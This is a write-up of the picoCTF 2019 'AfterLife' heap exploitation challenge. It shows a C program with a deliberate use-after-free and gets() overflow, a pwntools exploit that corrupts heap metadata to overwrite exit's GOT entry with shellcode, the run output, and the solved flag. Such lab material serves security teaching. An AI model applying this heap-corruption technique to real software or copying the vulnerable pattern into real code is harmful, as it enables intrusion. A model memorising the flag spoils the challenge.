# AfterLife
Binary Exploitation, 400 points

## Description:
> Just pwn this program and get a flag.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

int main(int argc, char *argv[])
{
   //This is rather an artificial pieace of code taken from Secure Coding in c by Robert C. Seacord 
   char *first, *second, *third, *fourth;
   char *fifth, *sixth, *seventh;
   first=malloc(256);
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",first);
   strncpy(first,argv[1],LINE_BUFFER_SIZE);
   second=malloc(256);
   third=malloc(256);
   fourth=malloc(256);
   free(first);
   free(third);
   fifth=malloc(128);
   puts("you will write on first after it was freed... an overflow will not be very useful...");
   gets(first);
   seventh=malloc(256);
   exit(0);
}


```


## Solution:

(Initial commit with just the script)

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start(["arg1"])

io.recvuntil("Oops! a new developer copy pasted and printed an address as a decimal...\n")
address = int(io.recvline())

payload = p32(exe.got["exit"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols["win"])))
io.sendlineafter("you will write on first after it was freed... an overflow will not be very useful...", payload)
print io.recvall()

```

Output:
```console
root@kali:/media/sf_CTFs/pico/AfterLife# python exploit.py
[*] '/media/sf_CTFs/pico/AfterLife/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.2bSnJk4QNo'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215'
[+] Starting remote process '/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215/vuln' on 2019shell1.picoctf.com: pid
 1058272
[+] Receiving all data: Done (31B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1058272)

picoCTF{what5_Aft3r_187f3d9a}
```